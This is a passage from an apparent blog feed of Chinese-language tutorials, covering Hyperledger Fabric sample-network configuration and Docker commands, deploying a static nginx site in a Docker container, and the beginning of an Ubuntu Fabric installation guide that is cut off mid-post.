FourOrgsTradeChannel:</span></span><br><span class="line"><span class="attr">        Consortium:</span> <span class="string">TradeConsortium</span></span><br><span class="line"><span class="attr">        Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><h4 id="4、通道工件配置channel-artifacts剖析"><a href="#4、通道工件配置channel-artifacts剖析" class="headerlink" title="4、通道工件配置channel-artifacts剖析"></a>4、通道工件配置channel-artifacts剖析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeOrdererGenesis -outputBlock ./channel-artifacts/genesis.block   <span class="comment">##生成创世区块</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID tradechannel <span class="comment">## 生成通道配置信息</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/ExporterOrgMSPanchors.tx -channelID tradechannel -asOrg ExporterOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/ImporterOrgMSPanchors.tx -channelID tradechannel -asOrg ImporterOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/CarrierOrgMSPanchors.tx -channelID tradechannel -asOrg CarrierOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/RegulatorOrgMSPanchor.tx -channelID tradechannel -asOrg RegulatorORGMSP</span><br></pre></td></tr></table></figure><p>以上命令均包含在./trade.sh中，该脚本还应包含将环境变量FABRIC_CFG_PATH设置为指向包含configtx.yaml文件的文件夹才能使configtxgen工具正常工作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$&#123;PWD&#125;</span>/../bin:<span class="variable">$&#123;PWD&#125;</span>:<span class="variable">$PATH</span>   <span class="comment">##配置cryptogen环境变量（前面已配置，此例子无效）</span></span><br><span class="line">$ <span class="built_in">export</span> FABRIC_CFG_PATH=<span class="variable">$&#123;PWD&#125;</span>   <span class="comment">## $&#123;PWD&#125;获取当前目录路径的字符串值</span></span><br></pre></td></tr></table></figure><p>查看channel-artifacts文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ tree channel-artifacts</span><br><span class="line">channel-artifacts/</span><br><span class="line">├── CarrierOrgMSPanchors.tx    <span class="comment">##Carrier组织MSP锚节点配置</span></span><br><span class="line">├── channel.tx                 <span class="comment">##通道配置</span></span><br><span class="line">├── ExporterOrgMSPanchors.tx   <span class="comment">##Exportor组织MSP锚节点配置</span></span><br><span class="line">├── genesis.block              <span class="comment">##创世区块</span></span><br><span class="line">├── ImporterOrgMSPanchors.tx   <span class="comment">##Importer组织MSP锚节点通道配置</span></span><br><span class="line">└── RegulatorOrgMSPanchors.tx  <span class="comment">##Regulator组织MSP锚节点通道配置</span></span><br></pre></td></tr></table></figure><h3 id="四、示例贸易网络分析"><a href="#四、示例贸易网络分析" class="headerlink" title="四、示例贸易网络分析"></a>四、示例贸易网络分析</h3><h4 id="1、相关docker镜像及配置"><a href="#1、相关docker镜像及配置" class="headerlink" title="1、相关docker镜像及配置"></a>1、相关docker镜像及配置</h4><p>hyperledger将该网络运行在三个docker镜像中，在前面的hyperledger fabric环境搭建中已经下拉了这些镜像，可以通过docker命令查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker images |grep hyperledger/fabric-[opc][^co].*[^-]latest</span><br><span class="line">hyperledger/fabric-orderer     latest     <span class="comment">## 用于orderer</span></span><br><span class="line">hyperledger/fabric-peer        latest     <span class="comment">## 用于peer</span></span><br><span class="line">hyperledger/fabric-ca          latest     <span class="comment">## 用于MSP</span></span><br></pre></td></tr></table></figure><p>与docker相关配置文件有三个peer-base.yaml、docker-compose-base.yaml和docker-compose-e2e.yaml，前者是后者的扩展（extends）。</p><h4 id="2、peer-base-yaml配置剖析"><a href="#2、peer-base-yaml配置剖析" class="headerlink" title="2、peer-base.yaml配置剖析"></a>2、peer-base.yaml配置剖析</h4><p>peer-base.yaml在./base 文件夹中，该配置定义了四个peer共同的相关配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span>   <span class="comment">#服务定义 开始标签</span></span><br><span class="line"><span class="attr">  peer-base:</span>   <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hyperledger/fabric-peer:$IMAGE_TAG</span>   <span class="comment">#docker镜像名</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock</span></span><br><span class="line">      <span class="comment"># the following setting starts chaincode containers on the same</span></span><br><span class="line">      <span class="comment"># bridge network as the peers</span></span><br><span class="line">      <span class="comment"># https://docs.docker.com/compose/networking/</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=$&#123;COMPOSE_PROJECT_NAME&#125;_trade</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_LOGGING_LEVEL=INFO</span>    <span class="comment">#记录信息、警告和错误消息</span></span><br><span class="line">      <span class="comment">#- CORE_LOGGING_LEVEL=DEBUG</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_USELEADERELECTION=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_ORGLEADER=false</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_PROFILE_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt</span></span><br><span class="line"><span class="attr">    working_dir:</span> <span class="string">/opt/gopath/src/github.com/hyperledger/fabric/peer</span> <span class="comment">#工作路径</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">peer</span> <span class="string">node</span> <span class="string">start</span>  <span class="comment">#启动命令</span></span><br></pre></td></tr></table></figure><h4 id="3、docker-compose-base-yaml配置剖析"><a href="#3、docker-compose-base-yaml配置剖析" class="headerlink" title="3、docker-compose-base.yaml配置剖析"></a>3、docker-compose-base.yaml配置剖析</h4><p>docker-compose-base.yaml在./base文件夹中，该配置是每个对等节点具体的配置，以peer0.exporterorg.trade.com为例（其中orderer的配置与peer-base.yaml相似，可参考上面的配置）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">peer0.exporterorg.trade.com:</span>   <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    container_name:</span> <span class="string">peer0.exporterorg.trade.com</span>     <span class="comment">#容器名</span></span><br><span class="line"><span class="attr">    extends:</span>  <span class="comment">#扩展配置</span></span><br><span class="line"><span class="attr">      file:</span> <span class="string">peer-base.yaml</span>   <span class="comment">#扩展配置文件</span></span><br><span class="line"><span class="attr">      service:</span> <span class="string">peer-base</span>     <span class="comment">#扩展配置服务</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_ID=peer0.exporterorg.trade.com</span>   <span class="comment">#ID与configtx.yaml中相匹配</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_ADDRESS=peer0.exporterorg.trade.com:7051</span>  <span class="comment">#地址</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_BOOTSTRAP=peer0.exporterorg.trade.com:7051</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.exporterorg.trade.com:7051</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_LOCALMSPID=ExporterOrgMSP</span>   <span class="comment">#MSP与configtx.yaml中相匹配</span></span><br><span class="line"><span class="attr">    volumes:</span>   <span class="comment">#挂载卷</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/var/run/:/host/var/run/</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">../crypto-config/peerOrganizations/exporterorg.trade.com/peers/peer0.exporterorg.trade.com/msp:/etc/hyperledger/fabric/msp</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">../crypto-config/peerOrganizations/exporterorg.trade.com/peers/peer0.exporterorg.trade.com/tls:/etc/hyperledger/fabric/tls</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">peer0.exporterorg.trade.com:/var/hyperledger/production</span></span><br><span class="line"><span class="attr">    ports:</span>  <span class="comment">#端口映射  host主机端口:容器内端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7051</span><span class="string">:7051</span>   <span class="comment">#服务器侦听端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7053</span><span class="string">:7053</span>   <span class="comment">#客户端订阅端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7055</span><span class="string">:6060</span></span><br></pre></td></tr></table></figure><h4 id="4、docker-compose-e2e-yaml配置剖析"><a href="#4、docker-compose-e2e-yaml配置剖析" class="headerlink" title="4、docker-compose-e2e.yaml配置剖析"></a>4、docker-compose-e2e.yaml配置剖析</h4><p>docker-compose-e2e.yaml，由命令./trade.sh generate -c tradechannel创建，依赖于base / docker-compose-base.yaml（以及间接base / peer-base.yaml），从名为docker-compose-e2e-template.yaml的模板YAML文件创建（同一文件夹）。以exporter-ca为例查看相关MSP配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span>   <span class="comment">#服务定义 开始标签</span></span><br><span class="line"><span class="attr">  exporter-ca:</span>  <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hyperledger/fabric-ca:$IMAGE_TAG</span>   <span class="comment">#docker镜像</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server</span>  <span class="comment">#在MSP中运行的服务名</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_CA_NAME=ca-exporterorg</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_CERTFILE=/etc/hyperledger/fabric-ca-server-config/ca.exporterorg.trade.com-cert.pem</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_KEYFILE=/etc/hyperledger/fabric-ca-server-config/6842d1c3a357472cc249fe42d3e97ffe7ba0210ab89781a3fdd73cbc30f8934b_sk</span></span><br><span class="line"><span class="attr">    ports:</span>   <span class="comment">#端口映射  host主机端口:容器内端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"7054:7054"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">sh</span> <span class="bullet">-c</span> <span class="string">'fabric-ca-server start --ca.certfile /etc/hyperledger/fabric-ca-server-config/ca.exporterorg.trade.com-cert.pem --ca.keyfile /etc/hyperledger/fabric-ca-server-config/6842d1c3a357472cc249fe42d3e97ffe7ba0210ab89781a3fdd73cbc30f8934b_sk -b admin:adminpw -d'</span>    <span class="comment">#启动命令  默认登录名和密码（分别为admin和adminpw）</span></span><br><span class="line"><span class="attr">    volumes:</span>   <span class="comment">#挂载卷</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./crypto-config/peerOrganizations/exporterorg.trade.com/ca/:/etc/hyperledger/fabric-ca-server-config</span></span><br><span class="line"><span class="attr">    container_name:</span> <span class="string">ca_peerExporterOrg</span>    <span class="comment">#容器名</span></span><br><span class="line"><span class="attr">    networks:</span>  <span class="comment">#所处网络</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">trade</span></span><br></pre></td></tr></table></figure><h3 id="五、启动样本交易网络"><a href="#五、启动样本交易网络" class="headerlink" title="五、启动样本交易网络"></a>五、启动样本交易网络</h3><h4 id="1、启动网络"><a href="#1、启动网络" class="headerlink" title="1、启动网络"></a>1、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$./trade.sh up -c tradechannel</span><br></pre></td></tr></table></figure><h4 id="2、查看docker进程"><a href="#2、查看docker进程" class="headerlink" title="2、查看docker进程"></a>2、查看docker进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps <span class="comment">#查看docker进程</span></span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                       NAMES</span><br><span class="line">a716239d97ad        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 11 seconds       0.0.0.0:9055-&gt;6060/tcp, 0.0.0.0:9051-&gt;7051/tcp, 0.0.0.0:9053-&gt;7053/tcp      peer0.carrierorg.trade.com</span><br><span class="line">c3ce947f9490        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 12 seconds       0.0.0.0:8055-&gt;6060/tcp, 0.0.0.0:8051-&gt;7051/tcp, 0.0.0.0:8053-&gt;7053/tcp      peer0.importerorg.trade.com</span><br><span class="line">f8bae3919c76        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 11 seconds       0.0.0.0:7051-&gt;7051/tcp, 0.0.0.0:7053-&gt;7053/tcp, 0.0.0.0:7055-&gt;6060/tcp      peer0.exporterorg.trade.com</span><br><span class="line">f7fc7b67ab61        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   26 seconds ago      Up 14 seconds       0.0.0.0:7054-&gt;7054/tcp                                                      ca_peerExporterOrg</span><br><span class="line">5c23b50bfbf7        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 9 seconds        0.0.0.0:10055-&gt;6060/tcp, 0.0.0.0:10051-&gt;7051/tcp, 0.0.0.0:10053-&gt;7053/tcp   peer0.regulatororg.trade.com</span><br><span class="line">6e0235be3e7e        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   26 seconds ago      Up 9 seconds        0.0.0.0:8054-&gt;7054/tcp                                                      ca_peerImporterOrg</span><br><span class="line">2e47cb0610fc        hyperledger/fabric-orderer:latest   <span class="string">"orderer"</span>                26 seconds ago      Up 13 seconds       0.0.0.0:7050-&gt;7050/tcp                                                      orderer.trade.com</span><br><span class="line">d6e0acddea54        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   27 seconds ago      Up 15 seconds       0.0.0.0:10054-&gt;7054/tcp                                                     ca_peerRegulatorOrg</span><br><span class="line">918e7707db2a        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   27 seconds ago      Up 17 seconds       0.0.0.0:9054-&gt;7054/tcp                                                      ca_peerCarrierOrg</span><br></pre></td></tr></table></figure><p>hyperledger/fabric-orderer：启动一个orderer服务</p><p>hyperledger/fabric-peer：启动四个peer服务</p><p>hyperledger/fabric-ca：启动四个peer的MSP服务</p><h4 id="3、查看服务"><a href="#3、查看服务" class="headerlink" title="3、查看服务"></a>3、查看服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs &lt;container-ID&gt; <span class="comment">#查看容器的运行日志</span></span><br><span class="line">$ docker attach &lt;container-ID&gt; <span class="comment">#进入容器交互界面</span></span><br></pre></td></tr></table></figure><h4 id="4、关闭网络"><a href="#4、关闭网络" class="headerlink" title="4、关闭网络"></a>4、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh down -c tradechannel</span><br></pre></td></tr></table></figure><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>以上是个人学习hyperledger fabric的一些理解和整理，欢迎参考、交流和指正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、trade-finance-logistics网络介绍&quot;&gt;&lt;a href=&quot;#一、trade-finance-logistics网络介绍&quot; class=&quot;headerlink&quot; title=&quot;一、trade-finance-logistics网络介绍&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="区块链学习" scheme="https://j-kangel.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="blockchain" scheme="https://j-kangel.github.io/tags/blockchain/"/>
    
      <category term="hyperledger" scheme="https://j-kangel.github.io/tags/hyperledger/"/>
    
  </entry>
  
  <entry>
    <title>使用docker部署静态网站</title>
    <link href="https://j-kangel.github.io/2019/03/25/docker/"/>
    <id>https://j-kangel.github.io/2019/03/25/docker/</id>
    <published>2019-03-24T20:11:21.000Z</published>
    <updated>2019-04-04T06:53:13.702Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h4><p>参照<a href="https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分">https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分</a></p><h3 id="二、搭建静态网站"><a href="#二、搭建静态网站" class="headerlink" title="二、搭建静态网站"></a>二、搭建静态网站</h3><h4 id="1、创建docker镜像"><a href="#1、创建docker镜像" class="headerlink" title="1、创建docker镜像"></a>1、创建docker镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器</span><br><span class="line">root@6f9c831d1d1b:/<span class="comment">#        //进入docker交互式容器</span></span><br></pre></td></tr></table></figure><h4 id="2、在docker中安装nginx和vim"><a href="#2、在docker中安装nginx和vim" class="headerlink" title="2、在docker中安装nginx和vim"></a>2、在docker中安装nginx和vim</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get update</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y nginx</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y vim</span></span><br></pre></td></tr></table></figure><h4 id="3、创建网页目录"><a href="#3、创建网页目录" class="headerlink" title="3、创建网页目录"></a>3、创建网页目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># mkdir -p /var/www/html</span></span><br></pre></td></tr></table></figure><h4 id="4、添加网页"><a href="#4、添加网页" class="headerlink" title="4、添加网页"></a>4、添加网页</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># cd /var/www/html</span></span><br><span class="line">root@6f9c831d1d1b:/var/www/html<span class="comment"># vim index.html</span></span><br></pre></td></tr></table></figure><p>在index.html中输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>nginx in docker<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            Hello,World!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存后退出，查看端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port web</span><br></pre></td></tr></table></figure><p>显示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp -&gt; 0.0.0.0:32770</span><br></pre></td></tr></table></figure><h4 id="5、查看网页"><a href="#5、查看网页" class="headerlink" title="5、查看网页"></a>5、查看网页</h4><p>使用curl查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:32770     <span class="comment">#32770为容器端口</span></span><br></pre></td></tr></table></figure><p>使用浏览器查看,如下图所示：</p><p><img src="/2019/03/25/docker/0.JPG" alt=""></p><h3 id="三、docker其他命令"><a href="#三、docker其他命令" class="headerlink" title="三、docker其他命令"></a>三、docker其他命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker attach web  <span class="comment">##重新进入容器</span></span><br><span class="line">docker ps          <span class="comment">##查看docker进程</span></span><br><span class="line">docker top web     <span class="comment">##查看docker容器的进程</span></span><br><span class="line">docker inspect | grep -i IPaddress   <span class="comment">##查看docker的ip地址</span></span><br><span class="line">docker inspect | grep -i hostport    <span class="comment">##查看容器端口</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、环境准备&quot;&gt;&lt;a href=&quot;#一、环境准备&quot; class=&quot;headerlink&quot; title=&quot;一、环境准备&quot;&gt;&lt;/a&gt;一、环境准备&lt;/h3&gt;&lt;h4 id=&quot;1、安装docker&quot;&gt;&lt;a href=&quot;#1、安装docker&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="区块链学习" scheme="https://j-kangel.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="docker" scheme="https://j-kangel.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 16.04 搭建hyperledger fabric 1.4</title>
    <link href="https://j-kangel.github.io/2019/03/24/hyperledger/"/>
    <id>https://j-kangel.github.io/2019/03/24/hyperledger/</id>
    <published>2019-03-23T16:35:38.000Z</published>
    <updated>2019-04-04T06:53:48.020Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、准备阶段"><a href="#一、准备阶段" class="headerlink" title="一、准备阶段"></a>一、准备阶段</h3><h4 id="1、系统软件源改为-aliyun"><a href="#1、系统软件源改为-aliyun" class="headerlink" title="1、系统软件源改为 aliyun"></a>1、系统软件源改为 aliyun</h4><p>步骤：setting -&gt; system settings -&gt; Software&amp;Updates -&gt; Download from -&gt; China -&gt; aliyun</p><p>结果如下：</p><p><img src="/2019/03/24/hyperledger/1.JPG" alt=""></p><h4 id="2、必备软件安装"><a href="#2、必备软件安装" class="headerlink" title="2、必备软件安装"></a>2、必备软件安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装vim          sudo apt-get install vim</span><br><span class="line">安装git          sudo apt-get install git</span><br><span class="line">安装curl         sudo apt-get install curl</span><br><span class="line">安装wget         sudo apt-get install wget</span><br></pre></td></tr></table></figure><h3 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h3><ul><li><p>安装go1.11 以及以上版本</p></li><li><p>安装docker 18.09.3-ce 以及以上版本</p></li><li><p>安装docker-compose 1.23.2 以及以上版本</p></li><li><p>git 拉下 fabric-sample 项目</p></li><li><p>下载docker image镜像</p><h4 id="1、go安装"><a href="#1、go安装" class="headerlink" title="1、go安装"></a>1、go安装</h4><p>下载并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~  </span><br><span class="line">wget https://studygolang.com/dl/golang/go1.11.linux-amd64.tar.gz    <span class="comment">#下载</span></span><br><span class="line">tar -xzf go1.11.linux-amd64.tar.gz    <span class="comment">#解压</span></span><br><span class="line">sudo mv go /usr/<span class="built_in">local</span>    <span class="comment">#移动</span></span><br></pre></td></tr></table></figure><p>路径配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin     <span class="comment">#环境变量</span></span><br><span class="line"><span class="built_in">export</span>  GOROOT=/usr/<span class="built_in">local</span>/go             <span class="comment">#安装根路径</span></span><br><span class="line"><span class="built_in">export</span>  GOPATH=<span class="variable">$HOME</span>/go                  <span class="comment">#为后续安装fabric作准备</span></span><br><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/go/bin          <span class="comment">#环境变量</span></span><br></pre></td></tr></table></figure><p>创建go目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 